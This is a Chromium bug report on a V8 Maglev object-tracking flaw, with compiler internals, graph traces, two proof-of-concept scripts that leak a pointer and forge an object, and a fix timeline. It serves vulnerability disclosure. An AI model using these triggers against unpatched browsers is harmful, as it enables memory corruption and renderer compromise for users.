# Maglev's incorrect object tracking may lead to RCE vulnerability

| Field | Value |
|-------|-------|
| **Issue ID** | [366381662](https://issues.chromium.org/issues/366381662) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript, Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | vi...@chromium.org |
| **Created** | 2024-09-13 |
| **Bounty** | $10,000.00 |

## Description

VULNERABILITY DETAILS

## Background

First we need to understand two background knowledge (you may be more familiar with this knowledge than I am, but in order to make the report easier to understand, I decided to write it down)

1. Maglev will use Virtual Object to track the writing of objects, and optimize `obj.x=X; Y = obj.x` to `Y=X`. This optimization is mainly related to the optimization of the function `BuildLoadTaggedField()`. [Related code](https://github.com/v8/v8/blob/c261d0aa4f3cea062386a3d797c4b144055b825e/src/maglev/maglev-graph-builder.h#L2146)

```

  template <typename Instruction = LoadTaggedField, typename... Args>
  ValueNode* BuildLoadTaggedField(ValueNode* object, Args&&... args) {
    // The offset of the field to load
    auto offset = std::get<0>(std::make_tuple(args...));
    if (offset != HeapObject::kMapOffset &&
        CanTrackObjectChanges(object, TrackObjectMode::kLoad)) {    //<==Fast Path
      // Get VirtualObject according to the object allocation location
      VirtualObject* vobject =
          GetObjectFromAllocation(object->Cast<InlinedAllocation>());
      ValueNode* value;
      CHECK_NE(vobject->type(), VirtualObject::kHeapNumber);
      // Get the value corresponding to the field at offset through VirtualObject
      if (vobject->type() == VirtualObject::kDefault) {
        value = vobject->get(offset);
      } else {
        ...
        value = GetInt32Constant(vobject->double_elements_length());
      }
      return value;
    }
    return AddNewNode<Instruction>({object}, std::forward<Args>(args)...);//<==Slow Path
  }

```

This function is used to handle the loading of object fields. There are two implementation paths.

- Fast Path: The object being read can be tracked through VirtualObject, so the value written in the field will be obtained through VirtualObject directly
- Slot Path: Generate the corresponding object field loading operation

`GetObjectFromAllocation()` is used to obtain the corresponding VirtualObject according to object allocation position. If the VirtualObject is snapshotted (which means it is no longer the latest and cannot be read or written), then other Virtual Objects will be found from `current_interpreter_frame_.virtual_objects()` according to the object allocation position.

```
VirtualObject* MaglevGraphBuilder::GetObjectFromAllocation(
    InlinedAllocation* allocation) {
  VirtualObject* vobject = allocation->object();
  // If it hasn't be snapshotted yet, it is the latest created version of this
  // object, we don't need to search for it.
  if (vobject->IsSnapshot()) {
    vobject = current_interpreter_frame_.virtual_objects().FindAllocatedWith(
        allocation);
  }
  return vobject;
}

```

2. `VisitSingleBytecode()` method is used to build Maglev IR based on a bytecode. `merge_states_[offset]!=NULL` indicates that there is an instruction to jump to the `offset` position, and `current_interpreter_frame_` needs to be restored to the state of the jump instruction. For the target bytecode of the branch jump, `ProcessMergePoint()` will be called for processing

[Relevant code](https://github.com/v8/v8/blob/c261d0aa4f3cea062386a3d797c4b144055b825e/src/maglev/maglev-graph-builder.h#L725)

```
  void VisitSingleBytecode() {
    // Which bytecode is currently executed?
    int offset = iterator_.current_offset();

    // Get the frame status corresponding to the offset
    MergePointInterpreterFrameState* merge_state = merge_states_[offset];

    if (V8_UNLIKELY(merge_state != nullptr)) {
      // If it is not empty, it means there is a jump from X to offset. 
      // merge_states_[offset] records the interpreter state at position X.
      // Since it jumps from X to offset, the current_interpreter_frame_ needs 
      // to be set according to merge_states_[offset]
      ...

      if (V8_UNLIKELY(merge_state->is_exception_handler())) {   
        ...
      } else if (merge_state->is_loop() && !merge_state->is_resumable_loop() &&  
                 merge_state->is_unreachable_loop()) {
        ...
      } else {    // Jump caused by branch
        ProcessMergePoint(offset, preserve_known_node_aspects);    // <===Here
      }
      ...
    } else if (V8_UNLIKELY(current_block_ == nullptr)) {
      ...
    }
    ...

    // Call the corresponding Visit*() method according to the bytecode
    switch (iterator_.current_bytecode()) {
#define BYTECODE_CASE(name, ...)       \
  case interpreter::Bytecode::k##name: \
    Visit##name();                     \
    break;
      BYTECODE_LIST(BYTECODE_CASE)
#undef BYTECODE_CASE
    }
  }

```

`ProcessMergePoint()` calls `CopyFrom()` to copy the interpreter state from `merge_state`

```
  void ProcessMergePoint(int offset, bool preserve_known_node_aspects) {
    // Get the register state to which the offset should be restored
    MergePointInterpreterFrameState& merge_state = *merge_states_[offset];
    // Restore the current register state from merge_state
    current_interpreter_frame_.CopyFrom(*compilation_unit_, merge_state,
                                        preserve_known_node_aspects, zone());

    ProcessMergePointPredecessors(merge_state, jump_targets_[offset]);
  }

```

`CopyFrom()` copies the Ignition registers and VirtualObject when copying the interpreter state

```
void InterpreterFrameState::CopyFrom(const MaglevCompilationUnit& info,
                                     MergePointInterpreterFrameState& state,
                                     bool preserve_known_node_aspects = false,
                                     Zone* zone = nullptr) {
  // Copy the values in all registers according to state
  state.frame_state().ForEachValue(
      info, [&](ValueNode* value, interpreter::Register reg) {
          frame_[reg] = value;
      });
  ...
  // Copy virtual_objects_
  virtual_objects_ = state.frame_state().virtual_objects();
}

```
## Cause of the vulnerability

### Maglev Graph Building

Next I will explain what happened in POC1. The bytecode of the function `opt_me()` in POC1 is as follows

```
 0 :CreateFunctionContext [0], [1]
 3 :PushContext r0
 5 :Ldar a0
 7 :StaCurrentContextSlot [2]
 9 :LdaCurrentContextSlot [2]
11 :ToBooleanLogicalNot
12 :Star1
13 :LdaZero
14 :TestGreaterThan r1, [0]
17 :JumpIfFalse [11] (0xbc6002001b0 @ 28)
| 
|-->19 :LdaCurrentContextSlot [2]
|   21 :Inc [1]
|   23 :StaCurrentContextSlot [2]
|   25 :LdaSmi [1]
|   27 :Return
V
28 :LdaCurrentContextSlot [2]
30 :Return

```

Note:

- Since the parameter `a` is declared in the context of the function, and the immediately executed function `(() => { a; })();` also references the parameter `a`, `CreateFunctionContext` will create a `Context` object for the function `opt_me()`, and Maglev will use Virtual Object to track this `Context` object later.
- Reading parameter `a` corresponds to `LdaCurrentContextSlot`, and writing corresponds to `StaCurrentContextSlot`
- Branch is the key to triggering this vulnerability

Next, use the `--trace-maglev-graph-building` flag to track the process of Maglev building IR based on bytecode

1. When processing the bytecode `0: CreateFunctionContext`, it will be inlined and optimized to memory allocation and field writing nodes

The `n12 InlinedAllocation()` node will allocate a `Context` object. Maglev will use `VO{0}:n12` to track the `Context` object created here to optimize the read and write operations of the object field. At this time, `current_interpreter_frame_.virtual_object_` is `[VO{0}:n12]`

```
   0 : 88 00 01          CreateFunctionContext [0], [1]
== New block (merge @0x555561347f08) at 0x3329002993ad <SharedFunctionInfo opt_me>==
* VOs (Interpreter Frame State): 
- Copying frame state from merge @0x555561347f08
* VOs (Interpreter Frame State): 
* VOs (Merge Frame State): 
  0x555561348390  n8: Int32Constant(3) → (x), 0 uses 🪦
  0x555561348420  n9: Constant(0x332900299501 <ScopeInfo FUNCTION_SCOPE>) → (x), 0 uses 🪦
  0x5555613484b8  n10: SmiConstant(3) → (x), 0 uses 🪦
  0x555561348558  n11: AllocationBlock(Young) → (x), 0 uses 🪦
  0x5555613485e0  n12: InlinedAllocation(0x332900290625 <Map(FUNCTION_CONTEXT_TYPE)>) [n11:(x)] → (x), 0 uses (0 non escaping uses)
  0x5555613486d8  n13: StoreMap(0x332900290625 <Map(FUNCTION_CONTEXT_TYPE)>, InitializingYoung) [n12:(x)]
  0x5555613487c0  n14: StoreTaggedFieldNoWriteBarrier(0x4) [n12:(x), n10:(x)]
  0x555561348840  n15: StoreTaggedFieldWithWriteBarrier(0x8) [n12:(x), n9:(x)]
  0x555561348ae0  n16: StoreTaggedFieldWithWriteBarrier(0xc) [n12:(x), n4:(x)]
  0x555561348b48  n17: StoreTaggedFieldNoWriteBarrier(0x10) [n12:(x), n5:(x)]

```

2. When processing `7: StaCurrentContextSlot[2]`, the `TryBuildStoreTaggedFieldToAllocation()` method will be called, which will do the following
   1. Get `VO{0}:n12` corresponding to `n12: InlinedAllocation`, at which time the VirtualObject has not been snapshotted
   2. Record the field write: `VO{0}:n12[16] = InitialValue(a0)`
   3. Generate a `StoreTaggedField` node and write it to the object's field

```
   7 : 25 02             StaCurrentContextSlot [2]
  * Setting value in virtual object VO{0}:n12[16]: InitialValue(a0) → (x), 1 uses
  0x555561348be0  n18: StoreTaggedFieldWithWriteBarrier(0x10) [n12:(x), n2:(x)]
  * Recording context slot store n12[16]: InitialValue(a0) → (x), 2 uses

```

3. When processing `17: JumpIfFalse`
   1. Due to a branch, `MergePointInterpreterFrameState::New()` will set `snapshot = true` to `VO{0}:n12` in `current_interpreter_frame_.virtual_objects_`, indicating that it can no longer be modified.
   2. The jump target is `28`, so a copy of `current_interpreter_frame_` will be saved in `merge_states_[28]`, indicating the interpreter state that should be restored when processing `28`.

```
  17 : 9f 0b             JumpIfFalse [11]
  0x555561348fb8  n22: BranchIfRootConstant(true_value) [n21:(x)]
  0x555561349008  n23: RootConstant(false_value) → (x), 0 uses 🪦
  0x555561349448  n24: RootConstant(true_value) → (x), 0 uses 🪦
== New block (single fallthrough) at 0x3329002993ad <SharedFunctionInfo opt_me>==
* VOs (Interpreter Frame State): VO{0}:n12; 

```

4. When processing `23: StaCurrentContextSlot` of the fallthrough branch, since `VO{0}:n12` is no longer readable or writable, the following operations will be performed
   1. A new `VO{1}:n12` is copied based on `VO{0}:n12`. This VirtualObject can be read and written and is used to continue collecting field read and write information
   2. The `InlinedAllocation::vobject_` field corresponding to the `n12` node is updated to `VO{1}:n12` (originally `VO{0}:n12`)
   3. `VO{1}:n12` is added to `current_interpreter_frame_.frame_state_`: `[VO{1}:n12, VO{0}:n12]`
   4. Record the field write information in `VO{1}:n12`: `VO{1}:n12[16] = n27: Float64Add`, `n27` is the result value of `a+1`

```
  23 : 25 02             StaCurrentContextSlot [2]
  * Setting value in virtual object VO{1}:n12[16]: Float64Add [n25:(x), n26:(x)] → (x), 0 uses 🪦
  0x555561349a90  n28: Float64ToTagged [n27:(x)] → (x), 0 uses 🪦
  0x555561349a40  n29: StoreTaggedFieldWithWriteBarrier(0x10) [n12:(x), n28:(x)]
  * Recording context slot store n12[16]: Float64Add [n25:(x), n26:(x)] → (x), 1 uses

```

5. When processing `28: LdaCurrentContextSlot`
   1. Since this is the jump target of `17: JumpIfFalse`, we need to call `InterpreterFrameState::CopyFrom()` to restore the interpreter state according to `merge_states_[28]`. After restoration, `current_interpreter_frame_.frame_state_ = [VO{0}:n12]`. We find that `VO{1}:n12` is no longer available.
   2. However, **the `InlinedAllocation::vobject_` field corresponding to the `n12` node is still `VO{1}:n12`, and `snapshot` is still false**. Therefore, `GetObjectFromAllocation()` assumes that the value of this field is `n27: Float64Add` according to `VO{1}:n12[16]=n27: Float64Add`, and writes this value to the virtual register `Ra`. In fact, the node `n27` is invalid at this position

```
  28 : 16 02             LdaCurrentContextSlot [2]
== New block (merge @0x5555613490a0) at 0x24d6002993ad <SharedFunctionInfo opt_me>==
* VOs (Interpreter Frame State): VO{1}:n12; VO{0}:n12; 
- Copying frame state from merge @0x5555613490a0
* VOs (Interpreter Frame State): VO{1}:n12; VO{0}:n12; 
* VOs (Merge Frame State): VO{0}:n12; 
  * Reusing value in virtual object VO{1}:n12[16]: Float64Add [n25:(x), n26:(x)] → (x), 1 uses

```

6. When processing `30: Return`, since `Ra` contains the `n27` node, the `Float64ToTagged` node will use `n27` as a parameter.

```
  30 : af                Return
  0x555561349d10  n33: ReduceInterruptBudgetForReturn(30)
  0x555561349e08  n34: Float64ToTagged [n27:(x)] → (x), 0 uses 🪦
  0x555561349d58  n35: Return [n34:(x)]

```

The final constructed Maglev Graph is as follows

```
   11: AllocationBlock(Young) → (x), 1 uses
   12: InlinedAllocation(0x2290001d0725 <Map(FUNCTION_CONTEXT_TYPE)>) [n11:(x)] → (x), 9 uses (9 non escaping uses)
   ...
   17 : JumpIfFalse [11]
╭──22: BranchIfRootConstant(true_value) [n21:(x)] b3 b4
│   ↓
│ Block b3
|    ...
│  27: Float64Add [n25:(x), n26:(x)] → (x), 2 uses    <--------------------+
│  28: Float64ToTagged [n27:(x)] → (x), 1 uses                             |
│  29: StoreTaggedFieldWithWriteBarrier(0x10) [n12:(x), n28:(x)]           |
│  31: ReduceInterruptBudgetForReturn(27)                                  |
│  32: Return [n30:(x)]                                                    |
│                                                                          |
╰►Block b4                                                                 |
   33: ReduceInterruptBudgetForReturn(30)                                  |
   34: Float64ToTagged [n27:(x)] → (x), 1 uses ----------------------------+
   35: Return [n34:(x)]

```

We found that `34: Float64ToTagged [n27:(x)]` references an invalid node `27: Float64Add` which is not alive.

### Register Allocation

In the register allocation phase, when processing `34: Float64ToTagged [n27:(x)]`, since the node `n27` is no longer alive, the node's `ValueNode::spill_` is `INVALID` (that is, `-1`), which will generate an erroneous `GapMove((x) → [xmm0|R|f64])` node, indicating that a value at an invalid location is moved to `xmm0` register

```
After register allocation
   ...
   17 : JumpIfFalse [11]
╭──12/22: BranchIfRootConstant(true_value) [v11/n21:[rax|R|t]] b3 b4
│      ↓
│ Block b3
|    ...
│  14/27: Float64Add [v13/n25:[xmm0|R|f64], v5/n26:[xmm1|R|f64]] → [xmm0|R|f64], live range: [14-18]
│  15/31: ReduceInterruptBudgetForReturn(27)
│     41: ConstantGapMove(v4/n30 → [rax|R|t])
│  16/32: Return [v4/n30:[rax|R|t]]
│
╰►Block b4
   17/33: ReduceInterruptBudgetForReturn(30)
      42: GapMove((x) → [xmm0|R|f64])
   18/34: Float64ToTagged [v14/n27:[xmm0|R|f64]] → [rax|R|t], live range: [18-19]
   19/35: Return [v18/n34:[rax|R|t]]

```

In the register allocation phase, when processing `34: Float64ToTagged [n27:(x)]`, the `allocation()` method of the `ValueNode` object corresponding to `n27` is called to obtain the location where the node is allocated, as follows:

```
class ValueNode : public Node {
  compiler::InstructionOperand allocation() const {
    if (has_register()) {    
      return compiler::AllocatedOperand(compiler::LocationOperand::REGISTER,
                                        GetMachineRepresentation(),
                                        FirstRegisterCode());
    }
    DCHECK(is_loadable());    // <=== Here DCHECK fail
    return spill_;
  }
  
  bool is_loadable() const {
    return spill_.IsConstant() || spill_.IsAnyStackSlot();
  }

  union {
    ...
    NodeIdT* last_uses_next_use_id_;
    compiler::InstructionOperand spill_;    // INVALIE, -1
  };
  ...
}

```

`DCHECK(is_loadable())` fails because `spill_ = INVALID`, which is neither in a register, nor in memory, nor a constant.
This is what happens in POC1

### Code Generation

For v8 compiled with `is_debug=false`, v8 will continue to execute to the instruction generation phase.

During the instruction generation phase, `GapMove::GenerateCode()` will treat `spill_ = INVALID = -1` as the offset of the object on the stack when processing `GapMove((x) → [xmm0|R|f64])`, and mistakenly think that it wants to access the element at `stack[-1]`.

For a stack frame of size `0x18`, an instruction will be generated to access the element at `[rbp-0x20]`, resulting in an out-of-bounds access to an invalid value.

```
                  --   42: GapMove((x) → [xmm0|R|f64]) - Process@../../src/maglev/maglev-code-generator.cc:800
0x5555b7b80182   142  c5fb1045e0           vmovsd xmm0,[rbp-0x20]

```

This is what happened in `POC2`

### About the exploit

This vulnerability is very dangerous and has a high probability of being exploited, for example

- Placing an object at `rbp-0x20` and then reading it as a floating point number can leak the address (as shown in POC1)
- Controlling the data at `rbp-0x20` and reading it as a compressed pointer can forge an object (as shown in POC2)

The above is only one path to exploit this vulnerability. In fact, Virtual Object optimization is widely used in Maglev, and there may be other exploitation paths

### Suggestions for Patching Code

When processing MergePoint, call `Snapshot()` method for invalid `VirtualObject` in `InlinedAllocation::object_` to avoid tracking wrong values

VERSION

This vulnerability was introduced in commit `46dba0af41815f0afb21d5665cb40a21fb9295fd`, which tracks the reading and writing of object fields through Virtual objects.

Since then, this feature has been an experimental feature that is turned off by default and requires the `--maglev-object-tracking` flag to enable, until commit `0654522388d6a3782b9831b5de49b0c0abe0f643`, the optimization is turned on by default, so the vulnerability can be triggered without adding any flags

REPRODUCTION CASE

```
// POC1
function opt_me(a) {
    if (!a > 0) { 
        a++;
        return 1; 
    
        (() => {
            a;
        })();
    }
  
    return a;
}

%PrepareFunctionForOptimization(opt_me);
opt_me();
%OptimizeMaglevOnNextCall(opt_me);
opt_me();
print(opt_me({}));  // leak some pointer

```

Using debug compiled d8, execute as follows:

```
./d8 --allow-natives-syntax ./POC1.js

```

Please note: This vulnerability is related to Maglev's Object tracking optimization. Starting from commit `0654522388d6a3782b9831b5de49b0c0abe0f643` to the latest version, the Object tracking optimization is enabled by default. For previous versions, you need to add the `--maglev-object-tracking` flag to enable this feature

You will get the following DCHECK fail crash

```
#
# Fatal error in ../../src/maglev/maglev-ir.h, line 2467
# Debug check failed: is_loadable().
#
#
#
#FailureMessage Object: 0x7fffffffa318
==== C stack trace ===============================
...

```

Call Stack:

```
#0  0x0000555560e869e9 in v8::base::OS::Abort()::$_0::operator()() const (this=0x7fffffffa62f) at ../../src/base/platform/platform-posix.cc:734
#1  0x0000555560e869cb in v8::base::OS::Abort () at ../../src/base/platform/platform-posix.cc:734
#2  0x0000555560e6a28b in V8_Fatal (file=0x55555aaad0c5 "../../src/maglev/maglev-ir.h", line=0x9a3, format=0x55555ab0a512 "Debug check failed: %s.") at ../../src/base/logging.cc:215
#3  0x0000555560e69c1c in v8::base::(anonymous namespace)::DefaultDcheckHandler (file=0x55555aaad0c5 "../../src/maglev/maglev-ir.h", line=0x9a3, message=0x55555abd3968 "is_loadable()") at ../../src/base/logging.cc:59
#4  0x0000555560e6a33d in V8_Dcheck (file=0x55555aaad0c5 "../../src/maglev/maglev-ir.h", line=0x9a3, message=0x55555abd3968 "is_loadable()") at ../../src/base/logging.cc:227
#5  0x000055555d850bd0 in v8::internal::maglev::ValueNode::allocation (this=0x555561349c08) at ../../src/maglev/maglev-ir.h:2467
#6  0x000055555dd3ea4c in v8::internal::maglev::StraightForwardRegisterAllocator::AssignFixedInput (this=0x7fffffffb2a0, input=...) at ../../src/maglev/maglev-regalloc.cc:1212
#7  0x000055555dd3cb5c in v8::internal::maglev::StraightForwardRegisterAllocator::AssignInputs (this=0x7fffffffb2a0, node=0x55556134a180) at ../../src/maglev/maglev-regalloc.cc:1442
#8  0x000055555dd3ae96 in v8::internal::maglev::StraightForwardRegisterAllocator::AllocateNode (this=0x7fffffffb2a0, node=0x55556134a180) at ../../src/maglev/maglev-regalloc.cc:724
#9  0x000055555dd39945 in v8::internal::maglev::StraightForwardRegisterAllocator::AllocateRegisters (this=0x7fffffffb2a0) at ../../src/maglev/maglev-regalloc.cc:613
#10 0x000055555dd37399 in v8::internal::maglev::StraightForwardRegisterAllocator::StraightForwardRegisterAllocator (this=0x7fffffffb2a0, compilation_info=0x5555612f7ac0, graph=0x555561345cd0)
    at ../../src/maglev/maglev-regalloc.cc:205
#11 0x000055555d92cd30 in v8::internal::maglev::MaglevCompiler::Compile (local_isolate=0x5555612c53b0, compilation_info=0x5555612f7ac0) at ../../src/maglev/maglev-compiler.cc:192
#12 0x000055555da52b59 in v8::internal::maglev::MaglevCompilationJob::ExecuteJobImpl (this=0x5555612f7b60, stats=0x55556129fb58, local_isolate=0x5555612c53b0) at ../../src/maglev/maglev-concurrent-dispatcher.cc:137
#13 0x000055555c5af218 in v8::internal::OptimizedCompilationJob::ExecuteJob (this=0x5555612f7b60, stats=0x55556129fb58, local_isolate=0x5555612c53b0) at ../../src/codegen/compiler.cc:485
#14 0x000055555c5c9a84 in v8::internal::(anonymous namespace)::CompileMaglev (isolate=0x55556128b000, function=..., mode=v8::internal::ConcurrencyMode::kSynchronous, osr_offset=..., 
    result_behavior=v8::internal::(anonymous namespace)::CompileResultBehavior::kDefault) at ../../src/codegen/compiler.cc:1282
#15 0x000055555c5ba740 in v8::internal::(anonymous namespace)::GetOrCompileOptimized (isolate=0x55556128b000, function=..., mode=v8::internal::ConcurrencyMode::kSynchronous, code_kind=v8::internal::CodeKind::MAGLEV, 
    osr_offset=..., result_behavior=v8::internal::(anonymous namespace)::CompileResultBehavior::kDefault) at ../../src/codegen/compiler.cc:1379
#16 0x000055555c5bbad0 in v8::internal::Compiler::CompileOptimized (isolate=0x55556128b000, function=..., mode=v8::internal::ConcurrencyMode::kSynchronous, code_kind=v8::internal::CodeKind::MAGLEV)
    at ../../src/codegen/compiler.cc:3114
#17 0x000055555d654094 in v8::internal::__RT_impl_Runtime_CompileOptimized (args=..., isolate=0x55556128b000) at ../../src/runtime/runtime-compiler.cc:170
#18 0x000055555d653b50 in v8::internal::Runtime_CompileOptimized (args_length=0x1, args_object=0x7fffffffc4c0, isolate=0x55556128b000) at ../../src/runtime/runtime-compiler.cc:128
#19 0x0000555560645d7d in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit ()
#20 0x00005555602a7293 in Builtins_InterpreterEntryTrampoline ()

```

The following is a variant,

```
// POC2
function opt_me(a) {
    if (!a>0) {
        a+={};
        return a; 
        
        // 虽然不会被执行到, 但是访问外部的变量a, 用于让opt_me新建一个上下文
        (() => {
            a;
        })();
    }
    return a;
}

%PrepareFunctionForOptimization(opt_me);
opt_me(0);
opt_me(1);
%OptimizeMaglevOnNextCall(opt_me);
opt_me(0);

let res = opt_me({});   // fake obj

```

using v8 compiled with `is_debug = false`, and executing `./d8 --allow-natives-syntax ./POC2.js` will cause a memory segmentation fault, which reveals the potential for the vulnerability to be exploited

CREDIT INFORMATION

Reporter credit: 303f06e3

## Timeline

### cl...@appspot.gserviceaccount.com (2024-09-16)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5006294389817344.

### bb...@google.com (2024-09-16)

Seems to repro in clusterfuzz, dcheck failure.

Provisonally setting high, and sending over to v8.

### 24...@project.gserviceaccount.com (2024-09-16)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2024-09-16)

Detailed Report: https://clusterfuzz.com/testcase?key=5006294389817344

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  is_loadable() in maglev-ir.h
  v8::internal::maglev::ValueNode::allocation
  v8::internal::maglev::StraightForwardRegisterAllocator::AssignFixedInput
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=95757:95758

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5006294389817344

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### cl...@chromium.org (2024-09-17)

Bisects to `0654522 [maglev] Enable object tracking by Victor Gomes · 4 weeks ago`.

### le...@chromium.org (2024-09-17)

Let's revert that for now.

### pe...@google.com (2024-09-17)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-09-17)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### pe...@google.com (2024-09-17)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### 24...@project.gserviceaccount.com (2024-09-18)

ClusterFuzz testcase 5006294389817344 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=96134:96135

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### pe...@google.com (2024-09-18)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M130. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [130].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### am...@chromium.org (2024-09-18)

The revert was landed on 131, please also revert in 130 / 13.0 at your earliest convenience -- thank you

### ap...@google.com (2024-09-19)

Project: v8/v8
Branch: refs/branch-heads/13.0

commit 9b3d7d2f50720bc69a804376f6234b4cde07fa5e
Author: Leszek Swirski <leszeks@chromium.org>
Date:   Tue Sep 17 11:48:17 2024

    Merged: Revert "[maglev] Enable object tracking"
    
    This reverts commit 0654522388d6a3782b9831b5de49b0c0abe0f643.
    
    Reason for revert: crbug.com/366381662
    
    Original change's description:
    > [maglev] Enable object tracking
    >
    > Bug: v8:7700
    > Change-Id: I3ae73b0ae19e3fc5b3d1205c6cdfac24505e517b
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5803785
    > Commit-Queue: Leszek Swirski <leszeks@chromium.org>
    > Auto-Submit: Victor Gomes <victorgomes@chromium.org>
    > Reviewed-by: Leszek Swirski <leszeks@chromium.org>
    > Cr-Commit-Position: refs/heads/main@{#95758}
    
    (cherry picked from commit e5a048d7a04bb3175f7a0edbab31032a34d9349a)
    
    Bug: v8:7700, 366381662
    Change-Id: I910f1746b858a258e80bd99dd44b18e3b9a62c49
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5872499
    Auto-Submit: Leszek Swirski <leszeks@chromium.org>
    Reviewed-by: Patrick Thier <pthier@chromium.org>
    Commit-Queue: Patrick Thier <pthier@chromium.org>
    Cr-Commit-Position: refs/branch-heads/13.0@{#4}
    Cr-Branched-From: 4be854bd71ea878a25b236a27afcecffa2e29360-refs/heads/13.0.245@{#1}
    Cr-Branched-From: 1f5183f7ad6cca21029fd60653d075730c644432-refs/heads/main@{#96103}

M       src/flags/flag-definitions.h

https://chromium-review.googlesource.com/5872499


### ap...@google.com (2024-09-19)

Project: v8/v8
Branch: main

commit 6fa4a9c7492e5295b0ea0fd089de4cdd63aae1bc
Author: Leszek Swirski <leszeks@chromium.org>
Date:   Thu Sep 19 15:51:24 2024

    [maglev] Snapshot VOs before frame state copy
    
    ... to make sure that allocations don't use objects that only exist in
    the overwritten frame state.
    
    Fixed: 366381662
    Change-Id: I48ae063a5994fa375c82b88e93ce0aa5f132c150
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5872848
    Auto-Submit: Leszek Swirski <leszeks@chromium.org>
    Commit-Queue: Patrick Thier <pthier@chromium.org>
    Commit-Queue: Leszek Swirski <leszeks@chromium.org>
    Reviewed-by: Patrick Thier <pthier@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#96188}

M       src/maglev/maglev-interpreter-frame-state.h

https://chromium-review.googlesource.com/5872848


### pe...@google.com (2024-09-19)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### le...@chromium.org (2024-09-20)

No need to merge to M126, the flag was only enabled in M130 (<https://chromium-review.googlesource.com/c/v8/v8/+/5803785>)

### le...@chromium.org (2024-09-20)

Btw this was an *excellent* vulnerability report, with a very clear and detailed explanation, and the proposed fix was indeed the fix I ended up going with.

### bb...@google.com (2024-09-20)

Having looked through it as shepherd when triaging I will also add my +1 to this being very well written up. Kudos.

### qk...@google.com (2024-09-23)

Labeling as LTS-NotApplicable-126 because the flag[1] was only enabled in M130 according to the comment #17.

[1] https://chromium-review.googlesource.com/c/v8/v8/+/5803785

### ap...@google.com (2024-09-23)

[Details redacted due to bug visibility]

Change-Id: I27f2b941033ad569b181014afff8f7abc5d04ebe
https://chrome-internal-review.googlesource.com/7689243


### pe...@google.com (2024-09-23)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### da...@google.com (2024-09-24)

Updating merged label given #c14

### sp...@google.com (2024-09-30)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $10000.00 for this report.

Rationale for this decision:
$10,000 for high quality report of demonstrated memory corruption in a sandboxed process / the renderer 


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-09-30)

